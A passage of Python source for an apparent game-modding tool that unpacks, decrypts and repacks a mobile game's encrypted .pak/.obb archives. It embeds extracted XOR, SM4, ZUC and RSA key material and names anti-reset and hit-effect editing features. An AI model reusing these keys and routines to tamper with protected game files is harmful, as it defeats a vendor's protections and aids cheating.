    def _write(self,fp,e):
        em=e.encryption_method; cm=e.compression_method
        with open(fp,'wb') as f:
            if cm==_GRW_CM_NONE:
                d=self._peek(e.offset,e.size,em)
                if e.encrypted: d=_GRWCrypto.decrypt_block(d,fp,em)
                f.write(d); return
            for x in _GRWCrypto.gen_block_indices(len(e.compressed_blocks),em):
                d=self._peek_blk(e.compressed_blocks[x],em)
                if e.encrypted: d=_GRWCrypto.decrypt_block(d,fp,em)
                d=_GRWPakCompression.decomp_block(d,self._zstd_dict,cm)
                f.write(d)
    def dump(self,out):
        out/=self._mp
        for dp,dr in self._index.items():
            cop=Path(out/dp); cop.mkdir(parents=True,exist_ok=True)
            for fn,e in dr.items(): self._write(cop/fn,e)

# ---- GRW Repack helpers ----
def _grw_zstd_skippable(data,pad):
    if pad<=0: return data
    out=bytearray(data)
    while pad>0:
        fl=min(max(pad-8,0),1024*1024)
        out+=b"\x50\x2A\x4D\x18"+struct.pack("<I",fl)+b"\x00"*fl
        pad-=(8+fl)
    return bytes(out)

def _grw_encrypt_pt(pt,rel,em):
    if _GRWCrypto._is_s1(em): return bytes(b^_GRW_SIMPLE1_KEY for b in pt)
    if _GRWCrypto._is_s2(em):
        pt+=b'\x00'*((-len(pt))%_GRW_SIMPLE2_BLOCK)
        k,=struct.unpack('<I',_GRW_SIMPLE2_KEY); rolling=k; out=[]
        for x, in struct.iter_unpack('<I',pt):
            c=rolling^x; out.append(c); rolling^=c
        return struct.pack(f'<{len(out)}I',*out)
    if _GRWCrypto._is_sm4(em):
        key=_GRWCrypto._derive_sm4_key(rel,em); sm4=_GRWCrypto._sm4_ctx(key)
        pad=(-len(pt))%16
        if pad: pt=pt+b'\x00'*pad
        out=bytearray()
        for i in range(0,len(pt),16):
            blk=pt[i:i+16]
            if len(blk)<16: blk=blk.ljust(16,b'\x00')
            out.extend(sm4.encrypt(blk))
        return bytes(out)
    return pt

def _grw_repack_unc(outfh,pak,e,rel,nd):
    em=e.encryption_method; ts=e.size
    er=_GRWCrypto.align_enc(ts,em) if e.encrypted else ts
    pt=nd[:er]
    if e.encrypted:
        a=_GRWCrypto.align_enc(len(pt),em); pt+=b'\x00'*(a-len(pt))
        ci=_grw_encrypt_pt(pt,rel,em)
        outfh.seek(e.offset); outfh.write(ci)
        with open(pak._fp,"rb") as s:
            s.seek(e.offset+len(ci)); outfh.write(s.read(er-len(ci)))
    else:
        outfh.seek(e.offset); outfh.write(pt)
        with open(pak._fp,"rb") as s:
            s.seek(e.offset+len(pt)); outfh.write(s.read(ts-len(pt)))

def _grw_compress_block(chunk,cm,zd,ts,em):
    if cm in(_GRW_CM_ZSTD,_GRW_CM_ZSTD_DICT):
        for lvl in (22,19,16,13,10,7,4,1):
            try:
                c=ZstdCompressor(level=lvl,dict_data=zd if cm==_GRW_CM_ZSTD_DICT else None,threads=1)
                nc=c.compress(chunk)
                if len(nc)<=ts: return nc,True
            except: pass
        return None,False
    if cm==_GRW_CM_ZLIB:
        nc=zlib.compress(chunk,zlib.Z_BEST_COMPRESSION)
        return (nc,True) if len(nc)<=ts else (None,False)
    return None,False

def _grw_repack_comp(outfh,pak,e,rel,nd):
    blocks=e.compressed_blocks; em=e.encryption_method; cm=e.compression_method
    zd=pak._zstd_dict if cm==_GRW_CM_ZSTD_DICT else None
    order=_GRWCrypto.gen_block_indices(len(blocks),em)
    if len(nd)!=e.uncompressed_size:
        nd=nd.ljust(e.uncompressed_size,b'\x00') if len(nd)<e.uncompressed_size else nd[:e.uncompressed_size]
    if len(blocks)>1:
        cs=e.compression_block_size or 65536; ptr=0
        for _li,pi in enumerate(order):
            blk=blocks[pi]; ts=blk.end-blk.start
            cl=min(cs,len(nd)-ptr)
            if cl<=0: break
            chunk=nd[ptr:ptr+cl]; ptr+=cl
            nc,ok=_grw_compress_block(chunk,cm,zd,ts,em)
            with open(pak._fp,"rb") as s: s.seek(blk.start); orig=s.read(ts)
            if not ok: outfh.seek(blk.start); outfh.write(orig); continue
            if e.encrypted:
                if _GRWCrypto._is_sm4(em):
                    pl=(-len(nc))%16
                    if pl: nc+=b'\x00'*pl
                nc=_grw_encrypt_pt(nc,rel,em)
            if len(nc)>ts: outfh.seek(blk.start); outfh.write(orig); continue
            outfh.seek(blk.start); outfh.write(nc)
            if len(nc)<ts: outfh.write(b'\x00'*(ts-len(nc)))
    else:
        blk=blocks[0]; ts=blk.end-blk.start
        nc,ok=_grw_compress_block(nd,cm,zd,ts,em)
        with open(pak._fp,"rb") as s: s.seek(blk.start); orig=s.read(ts)
        if not ok: outfh.seek(blk.start); outfh.write(orig); return
        if e.encrypted:
            if _GRWCrypto._is_sm4(em):
                pl=(-len(nc))%16
                if pl: nc+=b'\x00'*pl
            nc=_grw_encrypt_pt(nc,rel,em)
        if len(nc)>ts: outfh.seek(blk.start); outfh.write(orig); return
        outfh.seek(blk.start); outfh.write(nc)
        if len(nc)<ts: outfh.write(b'\x00'*(ts-len(nc)))

def _grw_smart_resolve(fname,rfile,cands):
    rs=rfile.stat().st_size
    sm=[(p,e) for p,e in cands if e.uncompressed_size==rs]
    if len(sm)==1: return sm[0]
    if not sm: return None
    def fp(e): return (e.uncompressed_size,e.compression_method,e.encryption_method,len(e.compressed_blocks),e.compression_block_size)
    bf=fp(sm[0][1])
    fm=[(p,e) for p,e in sm if fp(e)==bf]
    return fm[0] if len(fm)==1 else None

def _grw_repack_style(pak,edited_root,output_path):
    shutil.copy2(pak._fp,output_path)
    nm={}
    for dp,files in pak._index.items():
        for name,entry in files.items():
            fp_str=str(PurePath(dp)/name).replace("\\","/")
            nm.setdefault(name.lower(),[]).append((fp_str,entry))
    edited={}; skipped=[]
    for p in edited_root.rglob("*"):
        if not p.is_file(): continue
        fl=p.name.lower()
        if fl in nm:
            cands=nm[fl]
            if len(cands)==1:
                fpath,entry=cands[0]; edited[fpath]=(p,entry)
            else:
                res=_grw_smart_resolve(p.name,p,cands)
                if res: fpath,entry=res; edited[fpath]=(p,entry)
                else: skipped.append(p.name)
        else:
            stem=p.stem.lower(); ext=p.suffix.lower()
            pm=[]
            for dp,files in pak._index.items():
                for name,entry in files.items():
                    if Path(name).stem.lower()==stem and Path(name).suffix.lower()==ext:
                        pm.append((str(PurePath(dp)/name).replace("\\","/"),entry))
            if len(pm)==1: fpath,entry=pm[0]; edited[fpath]=(p,entry)
            else: skipped.append(p.name)
    if not edited:
        console.print("[bold #FF0055]❌ No files to repack![/bold #FF0055]"); return
    with open(output_path,"r+b") as outfh:
        for fp_str,(p,e) in edited.items():
            nd=p.read_bytes(); rel=PurePath(fp_str)
            if e.compression_method==_GRW_CM_NONE: _grw_repack_unc(outfh,pak,e,rel,nd)
            else: _grw_repack_comp(outfh,pak,e,rel,nd)
    console.print(f"[bold #00FF88]✅ @DR_@Black_Toxic000_TOOL Repack done! {len(edited)} file(s) replaced.[/bold #00FF88]")

def _grw_detect_mode(pak_path):
    name=pak_path.name.lower()
    if name=="mini_obb.pak": return "MINI_OBB"
    if "zsdic" in name: return "OBBZSDIC"
    if "game" in name or "patch" in name: return "GAMEPATCH"
    return "OBBZSDIC"

# ---- GRW Dump log ----
def _grw_dump_log(pak,log_path):
    CM_NAMES={_GRW_CM_NONE:"NONE",_GRW_CM_ZLIB:"ZLIB",_GRW_CM_ZSTD:"ZSTD",_GRW_CM_ZSTD_DICT:"ZSTD_DICT"}
    with open(log_path,'w',encoding='utf-8') as lf:
        lf.write("="*80+"\nGRW PAK UNPACK LOG\n"+"="*80+"\n\n")
        lf.write(f"PAK: {pak._fp}\nVersion: {pak._pi.version}\nMount: {pak._mp}\n\n")
        fc=0; cs={}; es={}
        for dp,files in pak._index.items():
            for fn,e in files.items():
                fc+=1; full=str(PurePath(dp)/fn).replace("\\","/")
                cs[e.compression_method]=cs.get(e.compression_method,0)+1
                es[e.encryption_method]=es.get(e.encryption_method,0)+1
                lf.write(f"[{fc}] {full}\n  Size: {e.uncompressed_size:,} | Comp: {CM_NAMES.get(e.compression_method,str(e.compression_method))} | Enc: {e.encryption_method} | Blocks: {len(e.compressed_blocks)}\n")
        lf.write(f"\nTotal: {fc}\n")
    console.print(f"[bold #00FF88]✅ GRW log saved: {log_path}[/bold #00FF88]")

# ---- GRW banner ----
def _grw_banner():
    os.system('cls' if os.name=='nt' else 'clear')
    
    # Multi-color gradient banner using ANSI/rich colors
    banner_lines = [
        "[red]░██████╗░██╗░░░██╗██████╗░██╗░░██╗░█████╗░███╗░░██╗[/red]",
        "[orange1]██╔════╝░██║░░░██║██╔══██╗██║░░██║██╔══██╗████╗░██║[/orange1]",
        "[yellow]╚█████╗░░██║░░░██║██████╦╝███████║███████║██╔██╗██║[/yellow]",
        "[green]░╚═══██╗░██║░░░██║██╔══██╗██╔══██║██╔══██║██║╚████║[/green]",
        "[cyan]██████╔╝░╚██████╔╝██████╦╝██║░░██║██║░░██║██║░╚███║[/cyan]",
        "[blue]╚═════╝░░░╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝[/blue]"
    ]
    
    # Join with proper spacing
    banner = "\n".join(banner_lines)
    console.print(banner)
    
    # Enhanced panel with gradient-like effect
    console.print(Panel(
        "[bold magenta]✦[/bold magenta] [bold cyan]TOXIC TOOL[/bold cyan] [bold yellow]by toxic[/bold yellow] [bold magenta]✦[/bold magenta]\n"
        "[dim cyan]┌─────────────────────────────────────┐[/dim cyan]\n"
        "[green]►[/green] [yellow]Advanced PAK Unpack[/yellow] [red]⚡[/red] [yellow]Repack Engine[/yellow] [green]◄[/green]\n"
        "[dim cyan]└─────────────────────────────────────┘[/dim cyan]\n"
        "[dim]Version:[/dim] [bold white]VIP[/bold white]  [dim]Status:[/dim] [green]● Ready[/green]",
        border_style="bright_magenta",
        box=box.DOUBLE_EDGE,
        padding=(1, 3),
        subtitle=f"[dim] {datetime.now().strftime('%H:%M:%S')} [/dim]",
        subtitle_align="right"
    ))
    
    # Decorative separator
    console.print("[dim cyan]" + "─" * 60 + "[/dim cyan]", justify="center")

# ---- GRW detect paks ----
def _grw_detect_paks(base_path):
    paks=list(base_path.glob("*.pak"))+list(base_path.glob("*.obb"))
    return sorted(paks,key=lambda x:x.name)

# ---- GRW main handler (called from TOXIC menu) ----
def handle_grw_tool():
    """GRW Advanced PAK Unpack/Repack Tool — option 14."""
    grw_base = Path.home() / "@Black_Toxic000/TOXIC_4_4/ADVANCE_TOOL"
    grw_base.mkdir(parents=True, exist_ok=True)

    while True:
        _grw_banner()
        pak_files = _grw_detect_paks(grw_base)

        if not pak_files:
            console.print(Panel(
                "[bold #FF0055]⚠  No .pak/.obb files found![/bold #FF0055]\n"
                f"[#FFAA00]Place .pak/.obb files in:[/#FFAA00] [cyan]{grw_base}[/cyan]",
                border_style="red", box=box.ROUNDED, padding=(1,2)
            ))
            try: Prompt.ask("[dim]Press Enter to continue...[/dim]", default='')
            except KeyboardInterrupt: return
            continue

        console.print(Panel(
            f"[bold #00FFFF]📁 Found {len(pak_files)} pak/obb file(s):[/bold #00FFFF]\n" +
            "\n".join(f"[#00CCFF]{i+1:2}. {p.name}[/#00CCFF] [#FFFF00]({p.stat().st_size/1024/1024:.2f} MB)[/#FFFF00]"
                      for i,p in enumerate(pak_files)),
            border_style="cyan", box=box.ROUNDED, padding=(1,2)
        ))

        console.print(Panel(
            "[bold #00FF00][[1]][/bold #00FF00] 📂 UNPACK — Extract .pak file\n"
            "[bold #00FFFF][[2]][/bold #00FFFF] 🔧 REPACK — Rebuild .pak file\n"
            "[bold #FF4444][[3]][/bold #FF4444] 🗑  CLEAR  — Remove temp folders\n"
            "[bold #FF69B4][[0]][/bold #FF69B4] 🔙 BACK   — Return to TOXIC Menu",
            title="[bold #FFD700]Black_Toxic000[/bold #FFD700]",
            border_style="#FFD700", box=box.ROUNDED, padding=(1,3)
        ))

        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            return

        if choice == '0':
            return

        elif choice in ('1','2'):
            # Select pak file
            if len(pak_files)==1:
                sel=pak_files[0]
            else:
                try:
                    fi=Prompt.ask(f"[bold yellow]Select file (1-{len(pak_files)})[/bold yellow]", default='').strip()
                    idx=int(fi)-1
                    if not (0<=idx<len(pak_files)):
                        console.print("[bold #FF0055]❌ Invalid selection[/bold #FF0055]"); time.sleep(1); continue
                    sel=pak_files[idx]
                except (ValueError, KeyboardInterrupt):
                    continue

            pak_name=sel.stem
            unpack_path=grw_base/f"Unpack_{pak_name}"
            repack_path=grw_base/f"Repack_{pak_name}"

            if choice=='1':
                unpack_path.mkdir(parents=True,exist_ok=True)
                repack_path.mkdir(parents=True,exist_ok=True)
                try:
                    with Progress(SpinnerColumn(),TextColumn("[bold cyan]  Unpacking...[/bold cyan]"),
                                  BarColumn(),TextColumn("{task.percentage:>3.0f}%"),console=console) as prog:
                        task=prog.add_task("unpack",total=100)
                        pak=_GRWPakFile(sel); prog.update(task,advance=40)
                        pak.dump(unpack_path); prog.update(task,advance=40)
                        log_path=unpack_path/f"GRW_Debug_{pak_name}.log"
                        _grw_dump_log(pak,log_path); prog.update(task,completed=100)
                    fc=sum(len(f) for f in pak._index.values())
                    console.print(Panel(
                        f"[bold #00FF88]✅ UNPACK DONE![/bold #00FF88]\n"
                        f"[#00CCFF]📁 Output: {unpack_path}[/#00CCFF]\n"
                        f"[#00CCFF]🔧 Repack folder: {repack_path}[/#00CCFF]\n"
                        f"[#FFFF00]📄 Files: {fc}[/#FFFF00]",
                        border_style="green", box=box.ROUNDED, padding=(1,2)
                    ))
                except Exception as ex:
                    console.print(f"[bold #FF0055]❌ Unpack error:[/bold #FF0055] {ex}")
                    traceback.print_exc()

            else:  # repack
                if not repack_path.exists():
                    console.print(Panel(
                        f"[bold #FF0055]❌ {repack_path} not found![/bold #FF0055]\n"
                        "[#FFAA00]Unpack the pak first (option 1).[/#FFAA00]",
                        border_style="red", box=box.ROUNDED
                    ))
                    try: Prompt.ask("[dim]Press Enter...[/dim]", default='')
                    except: pass
                    continue
                try:
                    with Progress(SpinnerColumn(),TextColumn("[bold cyan]  Repacking...[/bold cyan]"),
                                  BarColumn(),TextColumn("{task.percentage:>3.0f}%"),console=console) as prog:
                        task=prog.add_task("repack",total=100)
                        pak=_GRWPakFile(sel); prog.update(task,advance=20)
                        out_pak=sel.with_suffix(".grw_repack")
                        mode=_grw_detect_mode(sel)
                        console.print(f"[#00FFFF]Mode: {mode}[/#00FFFF]")
                        if mode=="MINI_OBB":
                            pak._is_zstd_with_dict=False; pak._zstd_dict=None
                        elif mode=="GAMEPATCH":
                            pak._is_zstd_with_dict=False; pak._zstd_dict=None
                        _grw_repack_style(pak,repack_path,out_pak); prog.update(task,advance=60)
                        if out_pak.stat().st_size!=sel.stat().st_size:
                            raise ValueError("Repack size mismatch!")
                        sel.unlink(); out_pak.rename(sel); prog.update(task,completed=100)
                    console.print(Panel(
                        "[bold #00FF88]✅ REPACK DONE![/bold #00FF88]\n"
                        "[#00CCFF]📦 Original file replaced.[/#00CCFF]",
                        border_style="green", box=box.ROUNDED, padding=(1,2)
                    ))
                except Exception as ex:
                    console.print(f"[bold #FF0055]❌ Repack error:[/bold #FF0055] {ex}")
                    traceback.print_exc()

        elif choice=='3':
            console.print("[bold #FFFF00]⚠  Clear all Unpack_* and Repack_* folders?[/bold #FFFF00]")
            try: conf=Prompt.ask("[bold]Confirm (y/N)[/bold]",default='n').strip().lower()
            except: conf='n'
            if conf=='y':
                count=0
                for item in grw_base.iterdir():
                    if item.is_dir() and (item.name.startswith("Unpack_") or item.name.startswith("Repack_")):
                        try: shutil.rmtree(item); console.print(f"[#00FF88]✓ Cleared: {item.name}[/#00FF88]"); count+=1
                        except Exception as ex: console.print(f"[#FF0055]✗ {item.name}: {ex}[/#FF0055]")
                console.print(f"[#00FF88]Done — {count} folder(s) removed.[/#00FF88]" if count else "[#FFAA00]Nothing to clear.[/#FFAA00]")
            else:
                console.print("[#FFAA00]Cancelled.[/#FFAA00]")
        else:
            console.print("[bold #FF0055]❌ Invalid option[/bold #FF0055]")

        try: Prompt.ask("[dim]Press Enter to continue...[/dim]", default='')
        except: pass

# ==================== END GRW TOOL ====================

# Tool configuration
TOOL_NAME = "TOXIC_4_4"
BASE_DIR = Path.cwd() / TOOL_NAME

# Folder structure - UPDATED (COMPARE_DAT only in DAT_COMPARE)
FOLDER_STRUCTURE = {
    'ZSDIC': ['INPUT', 'REPACKED', 'EDITED', 'UNPACKED', 'SEARCH_RESULTS', 'LUA_UNPACK'],
    'MINI_OBB': ['INPUT', 'REPACKED', 'EDITED', 'UNPACKED', 'SEARCH_RESULTS', 'LUA_UNPACK'],
    'OD_PAK': ['INPUT', 'REPACKED', 'EDITED', 'UNPACKED', 'SEARCH_RESULTS'],
    'GAMEPATCH': ['INPUT', 'REPACKED', 'EDITED', 'UNPACKED', 'SEARCH_RESULTS', 'LUA_UNPACK'],
    'ANTIRESET': ['ORG_OBB', 'MODDED_OBB', 'UNZIPPED', 'CONFIG'],
    'ENCRYPTION': ['NORMAL_ENC', 'CUSTOM_ENC', 'DECRYPT'],
    'CREDIT': ['video', 'text', 'text/ORG', 'text/output'],
    'SKIN_TOOL': ['SKIN_FOLDER', 'HIT_EFFECT', 'LOOTCRATES', 'KILLMSG', 'AUTO_THEME', 'GAMEPATCH', 'FINAL', 'CREDIT'],
    'SM4_FINDER': ['input', 'output', 'output/json', 'output/txt'],
    'ACTIVE_SAV': ['Backups', 'Templates'],
    'DAT_COMPARE': ['Original', 'Modded', 'RESULTS', 'COMPARE_DAT'],
    'PAK_PROTECTOR': ['INPUT', 'RESULT'],
    'PAK_LUA_TOOL': [ 'Manifest', 'LUA_ORIGINAL', 'DECOMPILED', 'EDIT_LUA', 'COMPILED', 'temp'],
}

# Add this before the PAK+LUA tool functions (around line 3100-3120)

# ==================== PAK + LUA TOOL PATHS ====================
PAK_LUA_DIR = BASE_DIR / "PAK_LUA_TOOL"
PAKS_DIR = PAK_LUA_DIR / "PAKS"          # Defined but won't be created
UNPACKED_DIR = PAK_LUA_DIR / "UNPACKED"  # Defined but won't be created
REPACKED_DIR = PAK_LUA_DIR / "REPACKED"  # Defined but won't be created
MANIFEST_DIR = PAK_LUA_DIR / "Manifest"
LUA_ORIGINAL_DIR = PAK_LUA_DIR / "LUA_ORIGINAL"
LUA_DECOMPILED_DIR = PAK_LUA_DIR / "DECOMPILED"
LUA_EDIT_DIR = PAK_LUA_DIR / "EDIT_LUA"
LUA_COMPILED_DIR = PAK_LUA_DIR / "COMPILED"
LUA_TEMP_DIR = PAK_LUA_DIR / "temp"

# ==================== PAK + LUA DIRECTORY SETUP ====================

def ensure_pak_lua_dirs():
    """Create ONLY these folders: EDIT_LUA, DECOMPILED, COMPILED, LUA_ORIGINAL, temp, Manifest"""
    dirs_to_create = [
        PAK_LUA_DIR,
        MANIFEST_DIR,
        LUA_ORIGINAL_DIR,
        LUA_DECOMPILED_DIR,
        LUA_EDIT_DIR,
        LUA_COMPILED_DIR,
        LUA_TEMP_DIR,
    ]
    for d in dirs_to_create:
        d.mkdir(parents=True, exist_ok=True)

# ==================== CONFIG FILE FOR THEME PERSISTENCE ====================
CONFIG_FILE = BASE_DIR / "config.json"

def load_theme_from_config():
    """Load saved theme from config file"""
    global _current_theme_key
    try:
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                theme_key = config.get('theme', '0')
                if theme_key in THEME_PRESETS:
                    _current_theme_key = theme_key
                    return True
    except Exception:
        pass
    return False

def save_theme_to_config():
    """Save current theme to config file"""
    global _current_theme_key
    try:
        config = {}
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
        config['theme'] = _current_theme_key
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        return True
    except Exception:
        return False
# Skin Tool specific subdirectories
SKIN_FOLDER_STRUCTURE = {
    'SKIN_FOLDER': ['input', 'repack_obb', 'unpack_pak', 'edited_dat', 'repack_pak', 'tmp', 'unpacked_obb', 'mini_output', 'mini_edited', 'zsdic_edited_dats', 'skindats'],
    'HIT_EFFECT': ['org', 'modified'],
    'LOOTCRATES': ['org', 'modified'],
    'KILLMSG': ['org', 'edited'],
    'AUTO_THEME': ['FILES', 'TXT', 'modified'],
    'CREDIT': ['text/ORG', 'text/output', 'video'],
    'GAMEPATCH': ['PAKS', 'UNPACKED', 'REPACKED', 'CHACHE', 'SOURCE'],
    'FINAL': [],
}

# Skin Tool file paths
SKIN_TOOL_DIR = BASE_DIR / 'SKIN_TOOL'
MODSKIN_TXT = SKIN_TOOL_DIR / "modskin.txt"
NULL_TXT = SKIN_TOOL_DIR / "null.txt"
CHANGELOG_TXT = SKIN_TOOL_DIR / "changelog.txt"
NULLED_LOG_TXT = SKIN_TOOL_DIR / "nulled.txt"
HIT_TXT_PATH = SKIN_TOOL_DIR / "hit.txt"
ATTACH_TXT = SKIN_TOOL_DIR / "attach.txt"
LOGO_FILE = SKIN_TOOL_DIR / "logo.txt"
AUTO_THEME_LOBBY_FILE = SKIN_TOOL_DIR / "AUTO_THEME" / "TXT" / "lobby.txt"

# Skin Tool Constants
MAGIC_NUMBER = b'\x28\xB5\x2F\xFD'
DICT_START_HEX = bytes.fromhex("37 A4 30 EC")
MAX_COMPRESSION_LEVEL = 22
MAX_WORKERS = os.cpu_count() or 4
TARGET_SIZE = 65536

# Mini OBB Constants
MINI_PAK_FILE = "mini_obb.pak"
MINI_SIGNATURE = b"\xCD\xEE\x61\x2C"
MINI_EXPECTED_MAGIC = b"\x28\xB5\x2F\xFD"

# GamePatch Constants
SIG2KEY = {
    bytes.fromhex("9DC7"): bytes.fromhex("E55B4ED1"),
    bytes.fromhex("9D81"): bytes.fromhex("E51D4ED1"),
}

GZIP_HEADER = b"\x1F\x8B"
MAX_OFFSET_TRY = 8
MIN_RESULT_SIZE = 32
ZLIB_HEADERS = [b"\x78\x01", b"\x78\x5E", b"\x78\x9C", b"\x78\xDA"]

MAGIC_EXT = {
    0x9e2a83c1: ".uasset",
    0x61754c1b: ".lua",
    0x090a0d7b: ".dat",
    0x007bfeff: ".dat",
    0x200a0d7b: ".dat",
    0x27da0020: ".res",
    0x00000001: ".res",
    0x7bbfbbef: ".res",
    0x44484b42: ".bnk",
}

# ==================== REPACK REPORT CLASS ====================

@dataclass
class FileRepackResult:
    file_name: str
    file_path: str
    total_blocks: int
    repacked_blocks: int
    skipped_blocks: int
    failed_blocks: int
    status: str  # "OK", "PARTIAL", "FAILED", "SKIPPED"

class RepackReport:
    def __init__(self, pak_name: str, out_path: str):
        self.pak_name = pak_name
        self.out_path = out_path
        self.start_time = time.time()
        self.results: list[FileRepackResult] = []

    def add_result(self, result: FileRepackResult):
        self.results.append(result)

    def print_report(self):
        elapsed = time.time() - self.start_time
        mins = int(elapsed // 60)
        secs = int(elapsed % 60)
        time_str = f"0:{mins:02d}:{secs:02d}"

        total_files = len(self.results)
        repacked_files = sum(1 for r in self.results if r.status in ("OK", "PARTIAL"))
        skipped_files = sum(1 for r in self.results if r.status == "SKIPPED")
        failed_files = sum(1 for r in self.results if r.status == "FAILED")

        total_blocks = sum(r.total_blocks for r in self.results)
        repacked_blocks = sum(r.repacked_blocks for r in self.results)

        # ── Header ──────────────────────────────────────────────────────
        console.print()
        console.print(Panel(
            f"[bold white]  PAK[/]   [cyan]{self.pak_name}[/]\n"
            f"[bold white]  OUT[/]   [yellow]{self.out_path}[/]",
            title="[bold magenta]⚡ REPACK REPORT[/]",
            border_style="magenta",
            padding=(0, 0)
        ))

        # ── Per-file breakdown ───────────────────────────────────────────
        if self.results:
            file_table = Table(
                title="[bold cyan]FILES[/]",
                box=box.SIMPLE_HEAD,
                border_style="cyan",
                show_lines=True,
                padding=(0, 1)
            )
            file_table.add_column("FILE", style="white", no_wrap=True)
            file_table.add_column("PATH", style="dim white")
            file_table.add_column("BLOCKS", style="yellow", justify="center")
            file_table.add_column("STATUS", justify="center")

            for r in self.results:
                block_str = f"{r.repacked_blocks}/{r.total_blocks}"
                if r.status == "OK":
                    status_str = "[bold green]✅ OK[/]"
                    block_style = "green"
                elif r.status == "PARTIAL":
                    status_str = "[bold yellow]⚠ PARTIAL[/]"
                    block_style = "yellow"
                elif r.status == "SKIPPED":
                    status_str = "[bold dim]⏭ SKIPPED[/]"
                    block_style = "dim"
                else:
                    status_str = "[bold red]❌ FAILED[/]"
                    block_style = "red"

                file_table.add_row(
                    r.file_name,
                    r.file_path,
                    f"[{block_style}]{block_str}[/]",
                    status_str
                )
            console.print(file_table)

        # ── Summary ──────────────────────────────────────────────────────
        summary = Table(
            title=f"[bold white]SUMMARY   {time_str}  {repacked_blocks}/{total_blocks} blocks[/]",
            box=box.SIMPLE_HEAD,
            border_style="green",
            padding=(0, 0)
        )
        summary.add_column("TOTAL",    style="white",  justify="center")
        summary.add_column("REPACKED", style="green",  justify="center")
        summary.add_column("SKIPPED",  style="yellow", justify="center")
        summary.add_column("FAILED",   style="red",    justify="center")
        summary.add_row(
            str(total_files),
            str(repacked_files),
            str(skipped_files),
            str(failed_files)
        )
        console.print(summary)

        # ── Output path ───────────────────────────────────────────────────
        console.print(Panel(
            f"[bold green]📦 Output:[/] [cyan]{self.out_path}[/]",
            border_style="green",
            padding=(0, 0)
        ))

# ==================== PAK + LUA TOOL PATHS ====================
PAK_LUA_DIR = BASE_DIR / "PAK_LUA_TOOL"
MANIFEST_DIR = PAK_LUA_DIR / "Manifest"
LUA_ORIGINAL_DIR = PAK_LUA_DIR / "LUA_ORIGINAL"
LUA_DECOMPILED_DIR = PAK_LUA_DIR / "DECOMPILED"
LUA_EDIT_DIR = PAK_LUA_DIR / "EDIT_LUA"
LUA_COMPILED_DIR = PAK_LUA_DIR / "COMPILED"
LUA_TEMP_DIR = PAK_LUA_DIR / "temp"

# ==================== PAK + LUA TOOL (OPTION 20) ====================
# Integrated from dravixtool.py - PAK Unpack -> LUA Decrypt -> Edit -> LUA Compile -> PAK Repack
# Fully developed by @TrnDravix - Integrated by @Black_Toxic000

import gc
import mmap
import tempfile
import atexit
import queue
import threading
from typing import List
from collections import defaultdict
from dataclasses import dataclass
from functools import lru_cache

# ============================================================
# INTERNAL CONSTANTS (formerly const.py)
# ============================================================

ZUC_KEY = bytes.fromhex('01010101010101010101010101010101')
ZUC_IV = bytes.fromhex('FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')

RSA_MOD_1 = bytes.fromhex(
    'CBE8B9F2504050EF9831B719E9A6249A6D238505ADE909BDE78C180DED6072A0C3347B8AF4780E1F212D952D82D4BF7F233C1ECA499E1F9D9A85B4FAD759F54BABC1666C5DE411EA9E4B2374425DD6C6F54333BBC8F2610FE6063E4D0D6C21A671A8F7C3740555E5DC06D4E1691C456DB4116C0C012BF7B206E8311AAAEC689952BF804EF638F09D5822B4117B114208F14DEB459E80CB770E5B0D7978E21F5E6CED4999D3583108221A7AB28B960277ADB5690A332784019D9C195BE4EA9EA0A09459010F236465DE0D59C3EF7324E954E1118D93EE19F299760C2CDB963CE87973EA5ECC9BBE81C27D4C7C8572AC07E9BCEAC9BD72AB7A56A3C0AD736ABCE4')
RSA_MOD_2 = bytes.fromhex(
    '7F58E8A39A4DA4E87357DDD650EAA16D3B5CE95B213D1030A662566444796A78A84AE9AC3DBFFDE7F41094896696835DAF13B89E6EC2B84963B1B1BAF7151DA245C3FBFAE2A6AE18B2684D03F9229DE2C91440F2A3A3BCDE1E5680C16722A88039C73560D5D43F4B6562C2EEA5B1D926D86B51108A2643C70FB74D6442CE3A08339B8FD8F660AE88129B7AB8C46F2FA58124485CCCB1E987B05A6DA65A01858ED3F89905449AE42BB07290FCB9994BF22E26610BCABB9804783A3B9587917F3D97316EDDA15C5E13F79066407B55A93B291B68A4AC42A98D6E35FED84B14A792D154E62028DDAD20FC301951E5924BE9AD62FB719DD94CC30CAB871BEC4377A8')

SIMPLE1_DECRYPT_KEY = 0x79
SIMPLE2_DECRYPT_KEY = bytes.fromhex('E55B4ED1')
SIMPLE2_BLOCK_SIZE = 16

SM4_SECRET_4 = 'eb691efea914241317a8'
SM4_SECRET_2 = 'Q0hVTKey$as*1ZFlQCiA'
SM4_SECRET_NEW = [
    'xG2qW5lP7lV2iN5fN5pG', 'xT1cJ6dL5wC0kK1rB4dK', 'qC4jS5bZ6fL5xE6nD4zA',
    'gD4jQ2aL3bS3lC3xT0iW', 'xU1yQ8wE9zY3gZ3bT5aE', 'uQ3cO2dX7xY4xU7gH7iS',
    'gW1fR0jK6wQ4oN0oK1kZ', 'aJ4pV7iZ7pU4wP2aC2cZ', 'cX6jT3cM2oT3vK0kJ1qN',
    'iT2vS0cS6yT6cZ1sE1lO', 'hM1pH9iY8wM9hT4lN5uJ', 'kG6bC8jK0fL0dE4sH4mL',
    'dB6lB3vE0eZ8wM8rI0aC', 'tP7sP7nI9rA2vQ4cV5yQ', 'aT0cL1yN4pT3sZ7eM2vY',
    'uV6fU8fC9zN3mP5dH8mN'
]

EM_SIMPLE1 = 1
EM_SIMPLE2 = 16
EM_SM4_2 = 2
EM_SM4_4 = 4
EM_SM4_NEW_BASE = 31
EM_SM4_NEW_MASK = ~EM_SM4_NEW_BASE
EM_UNKNOWN_17 = 17  
CM_NONE = 0
CM_ZLIB = 1
CM_ZSTD = 6
CM_ZSTD_DICT = 8
CM_MASK = 15

# ============================================================
# INTERNAL SM4 IMPLEMENTATION
# ============================================================

try:
    from gmalg.base import BlockCipher
    from gmalg.errors import *
    from gmalg.utils import ROL32
except ImportError:
    # Fallback if gmalg not installed
    class BlockCipher:
        pass
    class IncorrectLengthError(Exception):
        pass
    def ROL32(x, n):
